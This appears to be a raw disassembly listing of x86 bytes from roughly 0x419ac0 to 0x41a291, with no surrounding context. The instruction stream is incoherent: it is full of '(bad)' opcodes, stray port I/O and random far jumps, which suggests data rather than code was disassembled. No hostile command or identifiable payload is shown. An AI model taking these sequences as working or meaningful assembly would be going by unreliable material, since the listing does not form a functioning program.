  419ac0:	mov    fs,WORD PTR [eax+eiz*1+0x35]
  419ac4:	out    dx,al
  419ac5:	dec    eax
  419ac6:	je     0x419acb
  419ac8:	and    cl,BYTE PTR [edi+0x774a0987]
  419ace:	retf   0xbd5d
  419ad1:	bound  edi,QWORD PTR [edi+eiz*4+0x18]
  419ad5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419ad6:	fdivp  st(0),st
  419ad8:	in     al,dx
  419ad9:	lods   al,BYTE PTR ds:[esi]
  419ada:	in     al,dx
  419adb:	(bad)  
  419adc:	adc    al,0xfe
  419ade:	mov    eax,ds:0x6a3ab0bf
  419ae3:	pushf  
  419ae4:	jns    0x419b1e
  419ae6:	sbb    DWORD PTR [ebx+eax*1],0x62
  419aea:	outs   dx,BYTE PTR ds:[esi]
  419aeb:	mov    ebx,0xd38f5525
  419af0:	and    ch,BYTE PTR [eax]
  419af2:	add    al,0x28
  419af4:	stos   DWORD PTR es:[edi],eax
  419af5:	stc    
  419af6:	xchg   ah,bl
  419af8:	in     eax,0x15
  419afa:	outs   dx,BYTE PTR ds:[esi]
  419afb:	cld    
  419afc:	stos   BYTE PTR es:[edi],al
  419afd:	das    
  419afe:	sub    DWORD PTR [esi-0x68069fca],ebx
  419b04:	mov    ebp,0xa0098d2e
  419b09:	jg     0x419afc
  419b0b:	sbb    ecx,esp
  419b0d:	push   es
  419b0e:	sar    BYTE PTR [ebp-0x5fc8ea34],0x78
  419b15:	mov    ds:0xaa28e59f,al
  419b1a:	leave  
  419b1b:	push   cs
  419b1c:	push   ebx
  419b1d:	je     0x419b2e
  419b1f:	je     0x419b7b
  419b21:	mov    ?,WORD PTR [bx+0x5d0e]
  419b26:	pop    ebp
  419b27:	loope  0x419ad4
  419b29:	push   ebp
  419b2a:	hlt    
  419b2b:	adc    BYTE PTR [edi+0x28],dl
  419b2e:	test   DWORD PTR [ebp+0x71],ebx
  419b31:	cmp    al,BYTE PTR [ebp+0x65d7f9b9]
  419b37:	sub    BYTE PTR [edx-0x14bf59c0],0xad
  419b3e:	mov    BYTE PTR [esp+ebp*4+0x36b0e015],al
  419b45:	mov    esi,0x287fe566
  419b4a:	adc    esi,DWORD PTR [ecx]
  419b4c:	(bad)  
  419b4d:	loopne 0x419b11
  419b4f:	lods   eax,DWORD PTR ds:[esi]
  419b50:	jge    0x419b59
  419b52:	mov    al,ds:0xb6fc3a5e
  419b57:	and    al,0xfb
  419b59:	mov    ds:0x676b656f,al
  419b5e:	add    al,0x43
  419b60:	sub    eax,0xc8c35871
  419b65:	ja     0x419b73
  419b67:	out    0x75,eax
  419b69:	repz and edi,eax
  419b6c:	lods   al,BYTE PTR ds:[esi]
  419b6d:	mov    dh,0x1a
  419b6f:	cmp    esp,DWORD PTR [edi+0x29]
  419b72:	or     edx,esp
  419b74:	dec    ebp
  419b75:	dec    edx
  419b76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419b77:	xor    al,0xc0
  419b79:	mov    ds:0x996bb30a,al
  419b7e:	add    BYTE PTR [ebx-0x5e],bl
  419b81:	push   0xffffff8a
  419b83:	mov    ah,0x46
  419b85:	lahf   
  419b86:	f2xm1  
  419b88:	inc    ebp
  419b89:	xchg   ebx,eax
  419b8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419b8b:	lods   al,BYTE PTR ds:[esi]
  419b8c:	out    0x46,al
  419b8e:	lds    edx,FWORD PTR [eax+0x47]
  419b91:	add    bl,BYTE PTR [esi+0x54]
  419b94:	mov    WORD PTR [eax+0x9],cs
  419b97:	push   esi
  419b98:	bnd jns 0x419be8
  419b9b:	clc    
  419b9c:	xchg   BYTE PTR [eax],dl
  419b9e:	pushf  
  419b9f:	inc    esi
  419ba0:	mov    dl,0xdb
  419ba2:	lds    ebp,FWORD PTR [ebp-0x38]
  419ba5:	mov    BYTE PTR es:[esi+0x642ca0ee],bl
  419bac:	scas   eax,DWORD PTR es:[edi]
  419bad:	mov    BYTE PTR [edx],dh
  419baf:	pop    edx
  419bb0:	loop   0x419bba
  419bb2:	xchg   BYTE PTR [esi-0x58],dl
  419bb5:	mov    gs,WORD PTR [eax-0x3e]
  419bb8:	adc    ecx,DWORD PTR [edi+0x21e01ec1]
  419bbe:	pop    ecx
  419bbf:	pop    ebx
  419bc0:	dec    ebp
  419bc1:	(bad)  
  419bc2:	(bad)  
  419bc3:	leave  
  419bc4:	cmp    bh,BYTE PTR [ecx]
  419bc6:	pushf  
  419bc7:	cmp    eax,0xa4008ada
  419bcc:	or     al,0x8f
  419bce:	adc    ah,BYTE PTR [ecx+ebx*2-0x1e]
  419bd2:	and    esi,DWORD PTR [ebp+0x3b]
  419bd5:	stc    
  419bd6:	(bad)  
  419bd7:	(bad)  
  419bd9:	push   edi
  419bda:	lock mov cl,0x25
  419bdd:	xor    DWORD PTR [ebx],edx
  419bdf:	xlat   BYTE PTR ds:[ebx]
  419be0:	gs popf 
  419be2:	jl     0x419bd2
  419be4:	enter  0xc6c6,0xae
  419be8:	add    DWORD PTR [ecx],eax
  419bea:	mov    al,0xa2
  419bec:	ins    DWORD PTR es:[edi],dx
  419bed:	sub    esp,DWORD PTR [ecx+ebx*4]
  419bf0:	jg     0x419c54
  419bf2:	or     DWORD PTR [edx],0xffffffdf
  419bf5:	sbb    al,0x48
  419bf7:	xchg   BYTE PTR [ebx+0x27],cl
  419bfa:	inc    edi
  419bfb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419bfc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419bfd:	in     al,dx
  419bfe:	ficomp DWORD PTR [edi+0x52b428e8]
  419c04:	cwde   
  419c05:	inc    edx
  419c06:	jmp    0x74a4506e
  419c0b:	fsub   QWORD PTR [edi+0x1a]
  419c0e:	pop    edi
  419c0f:	js     0x419c4a
  419c11:	inc    ebx
  419c12:	push   ds
  419c13:	sub    ecx,DWORD PTR [ebx-0x6a]
  419c16:	sbb    eax,0x7b1589bf
  419c1b:	icebp  
  419c1c:	push   ds
  419c1d:	fiadd  WORD PTR [eax+ecx*8]
  419c20:	fstp   TBYTE PTR [ecx-0x5e]
  419c23:	jmp    0x774b2950
  419c28:	cmp    BYTE PTR [esi-0x1c],bl
  419c2b:	inc    edx
  419c2c:	adc    al,0xdf
  419c2e:	jb     0xc3fbc282
  419c34:	mov    cl,0x70
  419c36:	test   eax,0x27ed7398
  419c3b:	jge    0x419c49
  419c3d:	daa    
  419c3e:	mov    edx,0x5eced8dd
  419c43:	or     ch,cl
  419c45:	leave  
  419c46:	lock adc al,0xfa
  419c49:	dec    ecx
  419c4a:	iret   
  419c4b:	sub    ebx,DWORD PTR [edi+0x3d]
  419c4e:	inc    eax
  419c4f:	js     0x419cad
  419c51:	push   ds
  419c52:	cmp    DWORD PTR [esi+0x4a],esi
  419c55:	prefetch (bad)
  419c56:	or     eax,0x2791aad9
  419c5b:	pop    edi
  419c5c:	aam    0xaa
  419c5e:	dec    eax
  419c5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419c60:	pop    ebx
  419c61:	loopne 0x419c42
  419c63:	inc    eax
  419c64:	dec    ebx
  419c65:	sti    
  419c66:	jb     0x419c81
  419c68:	add    al,0x9a
  419c6a:	xchg   esp,eax
  419c6b:	and    eax,0x59a92055
  419c70:	xchg   ebx,eax
  419c71:	into   
  419c72:	mov    eax,ds:0xa06f5564
  419c77:	nop
  419c78:	leave  
  419c79:	push   ebx
  419c7a:	adc    al,BYTE PTR [ebx-0x6]
  419c7d:	dec    edi
  419c7e:	sub    BYTE PTR [edx-0x5875d6c2],ch
  419c84:	jg     0x419ca3
  419c86:	xchg   ebx,eax
  419c87:	shl    eax,0xae
  419c8a:	pop    ebx
  419c8b:	push   ebx
  419c8c:	enter  0x67a3,0x57
  419c90:	pop    ebp
  419c91:	mov    ch,0xce
  419c93:	or     bl,BYTE PTR [ecx]
	...
  419d11:	add    BYTE PTR [eax],al
  419d13:	add    BYTE PTR [eax],ah
  419d15:	lahf   
  419d16:	arpl   WORD PTR [ebp-0x40110201],cx
  419d1c:	mov    gs,WORD PTR [ebx-0xd0cbf00]
  419d22:	call   0x6900:0x13d06a9
  419d29:	pop    es
  419d2a:	add    BYTE PTR [eax],al
  419d2c:	sbb    cl,ah
  419d2e:	pop    ebp
  419d2f:	into   
  419d30:	pop    eax
  419d31:	xor    al,BYTE PTR [edx+0x53]
  419d34:	std    
  419d35:	shl    BYTE PTR [ebx-0x7bc0191e],1
  419d3b:	jge    0x419da9
  419d3d:	jb     0x419d2e
  419d3f:	dec    eax
  419d40:	pop    esp
  419d41:	jb     0x419ced
  419d43:	call   0x18ae:0xcfb56f9c
  419d4a:	std    
  419d4b:	das    
  419d4c:	xor    BYTE PTR [ebx+0x18aec8df],bl
  419d52:	popf   
  419d53:	ficomp DWORD PTR [esi+0x44]
  419d56:	or     eax,0x64d894e0
  419d5b:	adc    al,0xe6
  419d5d:	aam    0x52
  419d5f:	jge    0x419d75
  419d61:	imul   eax,DWORD PTR [ebx-0x563d866d],0x19
  419d68:	jns    0x419d13
  419d6a:	mul    dh
  419d6c:	cmp    eax,0x99999610
  419d71:	fsub   DWORD PTR [eax]
  419d73:	in     eax,dx
  419d74:	and    DWORD PTR [eax-0x43b8225e],ebx
  419d7a:	jb     0x419da4
  419d7c:	dec    ecx
  419d7d:	lock sub bh,BYTE PTR [ecx]
  419d80:	ret    0x5ac1
  419d83:	es in  al,dx
  419d85:	sbb    BYTE PTR [edx-0x3cd5415c],cl
  419d8b:	in     al,0x9e
  419d8d:	xchg   ecx,eax
  419d8e:	xor    al,0xd1
  419d90:	(bad)  
  419d91:	sbb    BYTE PTR [esi+0x69],bh
  419d94:	mov    ebp,0xbf8c2f15
  419d99:	inc    ecx
  419d9a:	mov    eax,0xfd315e16
  419d9f:	pop    ecx
  419da0:	xor    BYTE PTR [ecx],al
  419da2:	das    
  419da3:	jo     0x419d85
  419da5:	test   eax,0xe098dec3
  419daa:	sub    ecx,ebp
  419dac:	pop    esi
  419dad:	sbb    ebp,DWORD PTR ds:[esi-0x7c4d4069]
  419db4:	cdq    
  419db5:	popf   
  419db6:	ret    0x8663
  419db9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419dba:	xor    BYTE PTR [ebx+0x6b],al
  419dbd:	inc    ecx
  419dbe:	cmp    al,0xfb
  419dc0:	dec    ebp
  419dc1:	pop    edx
  419dc2:	mov    ebx,0x11382ee4
  419dc7:	mov    DWORD PTR [eax-0x4cbfae12],ebx
  419dcd:	jbe    0x419d95
  419dcf:	fimul  WORD PTR [eax+0x7d25e44]
  419dd5:	and    dh,BYTE PTR [edx]
  419dd7:	inc    ebx
  419dd8:	mov    al,0xdb
  419dda:	je     0x419e21
  419ddc:	cmp    BYTE PTR [ebx],0xd9
  419ddf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419de0:	pop    ds
  419de1:	popf   
  419de2:	lods   eax,DWORD PTR fs:[esi]
  419de4:	daa    
  419de5:	retf   0xc3d4
  419de8:	add    al,0x65
  419dea:	shl    BYTE PTR [eax-0x5f],1
  419ded:	inc    edi
  419dee:	mul    DWORD PTR ds:0x4f5bfff6
  419df4:	push   ecx
  419df5:	daa    
  419df6:	pop    esi
  419df7:	std    
  419df8:	sub    ah,ah
  419dfa:	(bad)  
  419dfb:	mov    bh,0x7d
  419dfd:	fwait
  419dfe:	mov    edi,0xa07c7d47
  419e03:	push   ss
  419e04:	jnp    0x419e36
  419e06:	sar    DWORD PTR [esi],0x79
  419e09:	mov    dh,0x7e
  419e0b:	xchg   DWORD PTR [ecx-0x7d],esp
  419e0e:	and    bh,dh
  419e10:	pop    ss
  419e11:	mov    eax,ds:0xf80fe70e
  419e16:	call   0x1a7c:0xa4e00503
  419e1d:	inc    ebp
  419e1e:	nop
  419e1f:	in     al,0xd0
  419e21:	scas   eax,DWORD PTR es:[edi]
  419e22:	popa   
  419e23:	or     eax,edx
  419e25:	xchg   esi,eax
  419e26:	pop    ds
  419e27:	or     al,0x76
  419e29:	rol    cl,0x9c
  419e2c:	jmp    0x419ea9
  419e2e:	nop
  419e2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419e30:	mov    bl,0x3b
  419e32:	mov    edx,0x251fa4c4
  419e37:	sbb    al,0x34
  419e39:	sub    bl,BYTE PTR [eax]
  419e3b:	push   esi
  419e3c:	adc    eax,0x91a44d25
  419e41:	pop    esi
  419e42:	repnz cmp al,BYTE PTR ds:[eax+0x6e]
  419e47:	xchg   edi,eax
  419e48:	mov    esp,0x61165920
  419e4d:	imul   eax,esp,0x3f5ad25f
  419e53:	(bad)  
  419e54:	xchg   edx,eax
  419e55:	stos   DWORD PTR es:[edi],eax
  419e56:	ins    DWORD PTR es:[edi],dx
  419e57:	pop    ecx
  419e58:	fsubr  DWORD PTR [edi-0x10]
  419e5b:	les    ebp,FWORD PTR [edi]
  419e5d:	inc    esi
  419e5e:	imul   BYTE PTR [ecx+0x38]
  419e61:	mov    fs,ecx
  419e63:	xor    eax,0xe700344d
  419e68:	xor    DWORD PTR [esi+ebp*8+0x687ba27e],edi
  419e6f:	rol    dh,cl
  419e71:	sbb    dh,BYTE PTR [eax+ebx*8-0x38291925]
  419e78:	addr16 jo 0x419e08
  419e7b:	mov    ebx,DWORD PTR [ebx]
  419e7d:	in     eax,dx
  419e7e:	xor    eax,DWORD PTR [ebp+0x53]
  419e81:	xor    ch,ch
  419e83:	sti    
  419e84:	ret    
  419e85:	inc    ebp
  419e86:	in     eax,0xcc
  419e88:	(bad)  
  419e8a:	into   
  419e8b:	cli    
  419e8c:	mov    ah,0x9c
  419e8e:	mul    dl
  419e90:	ins    DWORD PTR es:[edi],dx
  419e91:	mov    ds:0xeb8de59c,eax
  419e96:	bound  edi,QWORD PTR [ebx]
  419e98:	in     eax,dx
  419e99:	sbb    BYTE PTR [esi],dl
  419e9b:	mov    ch,0x66
  419e9d:	inc    esi
  419e9e:	cmp    ebp,ebx
  419ea0:	in     eax,dx
  419ea1:	and    al,0x9b
  419ea3:	shl    ch,1
  419ea5:	sti    
  419ea6:	lea    esp,[edx+0x10b5afc3]
  419eac:	xor    bl,BYTE PTR [eax]
  419eae:	in     eax,dx
  419eaf:	xchg   esp,eax
  419eb0:	jmp    0x419ed7
  419eb2:	sbb    DWORD PTR [edi+0x2f529f4],ebx
  419eb8:	jnp    0x419f22
  419eba:	pop    esi
  419ebb:	dec    edi
  419ebc:	sub    eax,0x8969dc0e
  419ec1:	pop    edi
  419ec2:	sub    BYTE PTR [ecx+0x721b4976],0x25
  419ec9:	lahf   
  419eca:	xchg   edi,eax
  419ecb:	out    0xa8,al
  419ecd:	xor    BYTE PTR [ebp+0x28],dl
  419ed0:	sbb    DWORD PTR [edx],edx
  419ed2:	ins    BYTE PTR es:[edi],dx
  419ed3:	repz xor ebx,DWORD PTR [edi]
  419ed6:	fnsetpm(287 only) 
  419ed8:	scas   al,BYTE PTR es:[edi]
  419ed9:	sti    
  419eda:	mov    ecx,0xa476e834
  419edf:	int    0x40
  419ee1:	mov    ds:0xd4e2330d,al
  419ee6:	pop    edx
  419ee7:	outs   dx,BYTE PTR ds:[esi]
  419ee8:	mov    BYTE PTR [ecx],dl
  419eea:	sub    edx,ecx
  419eec:	pop    ds
  419eed:	mov    bl,0x9a
  419eef:	push   0xffffffb8
  419ef1:	push   edi
  419ef2:	or     ebx,0x9e9cd4b6
  419ef8:	stos   DWORD PTR es:[edi],eax
  419ef9:	loopne 0x419f21
  419efb:	push   ss
  419efc:	daa    
  419efd:	repz dec ebp
  419eff:	cdq    
  419f00:	inc    ebx
  419f01:	sbb    bh,BYTE PTR [ecx]
  419f03:	or     BYTE PTR [ebp-0x2e],al
  419f06:	xor    DWORD PTR [edx-0x1],edi
  419f09:	xchg   DWORD PTR [ecx+0x74c03ac6],eax
  419f0f:	sti    
  419f10:	cmp    eax,0x63806e56
  419f15:	addr16 out dx,al
  419f17:	test   DWORD PTR [edx],0xe72274d3
  419f1d:	inc    ecx
  419f1e:	dec    edi
  419f1f:	rcl    dl,1
  419f21:	mov    ecx,0x80a135b1
  419f26:	outs   dx,BYTE PTR ds:[esi]
  419f27:	frstor [ebp+0x4b]
  419f2a:	into   
  419f2b:	xor    ecx,ebx
  419f2d:	(bad)  
  419f2f:	mov    esp,esp
  419f31:	(bad)  
  419f32:	xor    ah,BYTE PTR [esi-0x7a]
  419f35:	sti    
  419f36:	lock cmp esp,DWORD PTR [esi-0x12]
  419f3a:	inc    ebp
  419f3b:	mov    edi,0xdd25d33c
  419f40:	mov    dh,0xc0
  419f42:	pop    es
  419f43:	or     cl,BYTE PTR [eax+0x53]
  419f46:	jb     0x419eeb
  419f48:	repz xchg esi,eax
  419f4a:	fcomp  QWORD PTR [ebp+0x5bf02bb]
  419f50:	jb     0x419ef8
  419f52:	(bad)  
  419f54:	sub    BYTE PTR [ebx],dl
  419f56:	jp     0x419f30
  419f58:	push   es
  419f59:	dec    ecx
  419f5a:	dec    ecx
  419f5b:	add    BYTE PTR [edx+0x1b],0xde
  419f5f:	adc    ecx,DWORD PTR [edi+0x54]
  419f62:	arpl   WORD PTR es:[esi],si
  419f65:	fisttp QWORD PTR [ebx]
  419f67:	in     eax,dx
  419f68:	mov    ebx,DWORD PTR [ecx+0x42072b88]
  419f6e:	cmp    DWORD PTR [ecx+0x63],0x61
  419f72:	pop    es
  419f73:	cdq    
  419f74:	or     eax,0x3a
  419f77:	mov    dl,0xc0
  419f79:	push   esi
  419f7a:	inc    edi
  419f7b:	(bad)  
  419f7c:	push   ss
  419f7d:	arpl   WORD PTR [ecx],cx
  419f7f:	inc    ebp
  419f80:	ja     0x419f29
  419f82:	shl    BYTE PTR fs:[edi-0x4b],1
  419f86:	mov    edx,DWORD PTR [esi-0x36]
  419f89:	(bad)  
  419f8a:	retf   
  419f8b:	mov    ds:0x963bb51a,eax
  419f90:	clc    
  419f91:	clc    
  419f92:	mov    ebx,0x26f7a2c0
  419f97:	adc    ecx,DWORD PTR [ecx-0x5543ccd0]
  419f9d:	inc    esi
  419f9e:	mov    ebp,0x267bb791
  419fa3:	jge    0x419fd0
  419fa5:	or     DWORD PTR [eax+0x5747cd64],ebp
  419fab:	test   dl,dl
  419fad:	push   0xffffffa3
  419faf:	js     0x419fb2
  419fb1:	out    0x37,eax
  419fb3:	add    DWORD PTR [eax],edx
  419fb5:	jno    0x419f4c
  419fb7:	xchg   edi,eax
  419fb8:	(bad)  
  419fb9:	dec    edi
  419fba:	ins    DWORD PTR es:[edi],dx
  419fbb:	or     bl,dh
  419fbd:	jbe    0x419f40
  419fbf:	repnz cmp DWORD PTR [eax+0x2d9ae125],ebp
  419fc6:	push   0x5817863c
  419fcb:	scas   eax,DWORD PTR es:[edi]
  419fcc:	or     ch,BYTE PTR [esi]
  419fce:	xor    al,0x21
  419fd0:	jmp    0x8e43:0x8a0f4aea
  419fd7:	or     eax,ebx
  419fd9:	cdq    
  419fda:	add    cl,0x70
  419fdd:	ins    BYTE PTR es:[edi],dx
  419fde:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419fdf:	xor    al,0x7b
  419fe1:	xor    eax,0x53b79f0a
  419fe6:	xor    ebx,DWORD PTR [ebp*1+0x22522083]
  419fed:	cmp    al,0x68
  419fef:	fwait
  419ff0:	pop    esi
  419ff1:	add    edx,DWORD PTR [esp+ebp*8+0x266f5fdb]
  419ff8:	ins    BYTE PTR es:[edi],dx
  419ff9:	pop    eax
  419ffa:	aam    0xc
  419ffc:	lods   eax,DWORD PTR ds:[esi]
  419ffd:	add    dh,BYTE PTR [eax]
  419fff:	pop    ss
  41a000:	xor    DWORD PTR [ebp-0x566ff70b],0x2b
  41a007:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a008:	or     DWORD PTR [ebp-0x3371a852],0x2c
  41a00f:	stc    
  41a010:	xchg   edi,eax
  41a011:	cmp    eax,0x2f9a57a0
  41a016:	jl     0x41a053
  41a018:	adc    DWORD PTR [eax+ebx*8],esp
  41a01b:	mov    sp,0x1f5e
  41a01f:	mov    al,ds:0x3916046e
  41a024:	inc    edx
  41a025:	add    al,0xaf
  41a027:	inc    ebp
  41a028:	jne    0x419ff4
  41a02a:	or     esi,esi
  41a02c:	push   ebx
  41a02d:	mov    ebp,0xde7d644c
  41a032:	mov    eax,esp
  41a034:	popa   
  41a035:	sub    BYTE PTR [eax+0x54],cl
  41a038:	popf   
  41a039:	jnp    0x419fcf
  41a03b:	vmwrite ebp,DWORD PTR [ebx]
  41a03e:	pushf  
  41a03f:	add    esi,0x15
  41a042:	jo     0x41a056
  41a044:	loop   0x419ff5
  41a046:	les    eax,FWORD PTR [ebp+0x13732c00]
  41a04c:	jo     0x41a068
  41a04e:	sub    al,BYTE PTR [ecx]
  41a050:	mov    edi,0xc40b54f
  41a055:	adc    al,0xec
  41a057:	xor    bh,BYTE PTR [esi+0x7f1e63c7]
  41a05d:	pop    ebx
  41a05e:	scas   al,BYTE PTR es:[edi]
  41a05f:	mov    cl,0x77
  41a061:	lock xchg edx,eax
  41a063:	pop    ebp
  41a064:	adc    al,0xdb
  41a066:	jl     0x41a011
  41a068:	setge  BYTE PTR [edx-0x338d65c3]
  41a06f:	arpl   WORD PTR [ebp-0x7ced1938],di
  41a075:	fs push ds
  41a077:	retf   
  41a078:	pop    esp
  41a079:	jns    0x41a028
  41a07b:	push   esp
  41a07c:	fwait
  41a07d:	ins    BYTE PTR es:[edi],dx
  41a07e:	mov    ds,WORD PTR ss:[ebx+0x45]
  41a082:	or     BYTE PTR [eax-0x66],0xa3
  41a086:	jae    0x41a01a
  41a088:	mov    bl,0xf0
  41a08a:	icebp  
  41a08b:	jno    0x41a094
  41a08d:	popf   
  41a08e:	lock sbb BYTE PTR [ebx],al
  41a091:	cmp    al,0x35
  41a093:	js     0x41a075
  41a095:	xchg   BYTE PTR [ebx*2-0xf1c0350],ah
  41a09c:	mov    bh,0x9e
  41a09e:	loopne 0x41a0a3
  41a0a0:	cld    
  41a0a1:	lock sahf 
  41a0a3:	sbb    DWORD PTR ds:0x672a5b71,eax
  41a0a9:	stc    
  41a0aa:	push   0x743cdaa2
  41a0af:	(bad)  
  41a0b0:	(bad)  
  41a0b1:	stc    
  41a0b2:	icebp  
  41a0b3:	ins    DWORD PTR es:[edi],dx
  41a0b4:	sbb    eax,0x4d737faa
  41a0b9:	out    dx,al
  41a0ba:	pop    ss
  41a0bb:	jae    0x41a0ef
  41a0bd:	jmp    0x545a:0xbef8f7de
  41a0c4:	jae    0x41a0c2
  41a0c6:	cmp    al,0xfb
  41a0c8:	dec    esi
  41a0c9:	mov    al,ds:0x2e8f62d5
  41a0ce:	adc    dh,dl
  41a0d0:	jmp    0x41a0b6
  41a0d2:	int3   
  41a0d3:	adc    DWORD PTR [ecx-0x14c3be25],esi
  41a0d9:	add    BYTE PTR [ecx],dl
  41a0db:	dec    eax
  41a0dc:	adc    eax,0xbbf8a94c
  41a0e1:	mov    DWORD PTR [eax+ecx*1],0x2ccdff88
  41a0e8:	add    BYTE PTR [eax-0x73],0x8a
  41a0ec:	xor    esp,edx
  41a0ee:	or     DWORD PTR [ebx],esi
  41a0f0:	iret   
  41a0f1:	lods   al,BYTE PTR ds:[esi]
  41a0f2:	sub    dl,BYTE PTR [edx+0x4a]
  41a0f5:	dec    edi
  41a0f6:	add    BYTE PTR [edx+0x3b86b34c],cl
  41a0fc:	jl     0x41a0eb
  41a0fe:	dec    ecx
  41a0ff:	popa   
  41a100:	mov    ebp,0xc2238f93
  41a105:	pop    ebx
  41a106:	and    bl,ch
  41a108:	aas    
  41a109:	mov    ds:0x6c1c6b8a,eax
  41a10e:	ja     0x41a124
  41a110:	dec    ebp
  41a111:	sub    BYTE PTR [esi],dh
  41a113:	jmp    DWORD PTR [esi+0x7d]
  41a116:	retf   
  41a117:	jnp    0x41a13f
  41a119:	jle    0x41a157
  41a11b:	jae    0x41a175
  41a11d:	push   0x64
  41a11f:	mov    esp,0x4a805239
  41a124:	popa   
  41a125:	mov    ebx,0xafc5ec87
  41a12a:	ins    DWORD PTR es:[edi],dx
  41a12b:	mov    dl,0xcf
  41a12d:	xor    al,0xa3
  41a12f:	mov    bl,0xa1
  41a131:	adc    ebp,DWORD PTR [edx+esi*1]
  41a134:	sbb    eax,0xbe1e067a
  41a139:	mov    al,0xd3
  41a13b:	xor    BYTE PTR [edi],bh
  41a13d:	scas   eax,DWORD PTR es:[edi]
  41a13e:	xchg   edi,eax
  41a13f:	ds int3 
  41a141:	stc    
  41a142:	aam    0x73
  41a144:	out    dx,eax
  41a145:	in     al,dx
  41a146:	lds    esp,FWORD PTR [eax-0x70be6922]
  41a14c:	mov    dl,0x29
  41a14e:	or     DWORD PTR [eax+ecx*1-0x330cc0bb],ebp
  41a155:	stos   DWORD PTR es:[edi],eax
  41a156:	cmp    DWORD PTR [ecx+0x16151c7e],ecx
  41a15c:	outs   dx,DWORD PTR ds:[esi]
  41a15d:	cld    
  41a15e:	aam    0xd0
  41a160:	cmp    al,0xec
  41a162:	xlat   BYTE PTR ds:[ebx]
  41a163:	mov    ?,esi
  41a165:	xor    BYTE PTR [ebp+0x73],bh
  41a168:	pop    di
  41a16a:	mov    eax,ds:0xcc894f2d
  41a16f:	fdiv   QWORD PTR [esi]
  41a171:	rol    DWORD PTR [edi],cl
  41a173:	or     al,0x3b
  41a175:	jmp    0x9c9b:0xaf5d2af4
  41a17c:	push   DWORD PTR [eax]
  41a17e:	xor    BYTE PTR [edi],dh
  41a180:	dec    esp
  41a181:	pop    ss
  41a182:	jp     0x41a1ef
  41a184:	mov    esp,0xc58a90f3
  41a189:	inc    eax
  41a18a:	adc    dl,ch
  41a18c:	or     DWORD PTR [eax-0x45],ebp
  41a18f:	or     ebp,DWORD PTR [edi+esi*4-0x7c]
  41a193:	js     0x41a17c
  41a195:	mov    dh,0xde
  41a197:	clc    
  41a198:	mov    esp,0x4be53d18
  41a19d:	cli    
  41a19e:	add    eax,0xb654b14e
  41a1a3:	fwait
  41a1a4:	add    al,0x78
  41a1a6:	lods   al,BYTE PTR ds:[esi]
  41a1a7:	mov    ecx,0x782bef26
  41a1ac:	(bad)  
  41a1ad:	jbe    0x41a1bc
  41a1af:	sahf   
  41a1b0:	aad    0x35
  41a1b2:	fimul  WORD PTR [ecx]
  41a1b4:	jl     0x41a225
  41a1b6:	ss push ds
  41a1b8:	adc    DWORD PTR [eax],edx
  41a1ba:	mov    edx,0xc3d9d766
  41a1bf:	iret   
  41a1c0:	dec    edi
  41a1c1:	inc    ebx
  41a1c2:	es icebp 
  41a1c4:	paddd  mm6,QWORD PTR [eax+0x77]
  41a1c8:	xchg   ebp,eax
  41a1c9:	or     ah,BYTE PTR [esi+0x5e]
  41a1cc:	or     eax,0xb272dd05
  41a1d1:	jmp    0xd8fc:0x49d886af
  41a1d8:	arpl   WORD PTR [ebx-0x2fd561aa],cx
  41a1de:	(bad)  
  41a1df:	mov    ds:0xcf6fd6fb,al
  41a1e4:	das    
  41a1e5:	clc    
  41a1e6:	cmp    al,0x2
  41a1e8:	aad    0x22
  41a1ea:	mov    bl,0xde
  41a1ec:	std    
  41a1ed:	rcl    dl,0x7f
  41a1f0:	mov    ch,0x69
  41a1f2:	mov    WORD PTR [ecx+0x32],gs
  41a1f5:	mov    cl,BYTE PTR gs:[ebp+0x4a]
  41a1f9:	and    BYTE PTR [edx],ch
  41a1fb:	stos   BYTE PTR es:[edi],al
  41a1fc:	jne    0x41a215
  41a1fe:	add    DWORD PTR [edx+0x59],0x5e8aab21
  41a205:	xor    esi,edx
  41a207:	into   
  41a208:	xchg   DWORD PTR [eax],edx
  41a20a:	pop    eax
  41a20b:	xchg   ebp,eax
  41a20c:	mov    bh,0x3
  41a20e:	outs   dx,DWORD PTR ds:[esi]
  41a20f:	jmp    0x5e4574d4
  41a214:	xor    edi,ebp
  41a216:	lock and edx,DWORD PTR [ebp+0x175837f0]
  41a21d:	sub    al,0xed
  41a21f:	adc    esp,ebx
  41a221:	rcr    esp,0x6d
  41a224:	in     al,dx
  41a225:	fimul  DWORD PTR [eax+0x7]
  41a228:	fcom   QWORD PTR [edi-0x3227d6ff]
  41a22e:	push   ecx
  41a22f:	inc    esi
  41a230:	push   esp
  41a231:	add    DWORD PTR ds:0x92926d50,eax
  41a237:	cmp    esp,DWORD PTR fs:[eax+0x71]
  41a23b:	pop    edx
  41a23c:	shl    BYTE PTR [ecx+0x4e2fb3ca],1
  41a242:	xchg   BYTE PTR [bx+0x5e],bl
  41a246:	dec    edi
  41a247:	mov    cl,ah
  41a249:	xor    edx,DWORD PTR cs:[esi+0xa]
  41a24d:	mov    cl,0x30
  41a24f:	add    edi,0xfce5d687
  41a255:	xchg   DWORD PTR [edi+0x34],edi
  41a258:	inc    edx
  41a259:	adc    bl,bl
  41a25b:	nop
  41a25c:	sub    esi,ebx
  41a25e:	lods   al,BYTE PTR ds:[esi]
  41a25f:	fnsave [edi+0x60]
  41a262:	(bad)  
  41a263:	mov    ah,0xf1
  41a265:	jo     0x41a242
  41a267:	and    cl,cl
  41a269:	sub    BYTE PTR [esi+0xe11de21],bl
  41a26f:	mov    ah,0x7b
  41a271:	or     edx,DWORD PTR [esp+esi*8-0x5f870078]
  41a278:	sbb    eax,0x42748550
  41a27d:	ficomp DWORD PTR [esi-0x74a60784]
  41a283:	pop    esi
  41a284:	push   esi
  41a286:	lods   al,BYTE PTR ds:[esi]
  41a287:	aaa    
  41a288:	inc    eax
  41a289:	ja     0x41a271
  41a28b:	js     0x41a218
  41a28d:	imul   esp,DWORD PTR [esi-0x35],0xffffffbc
  41a291:	(bad)  
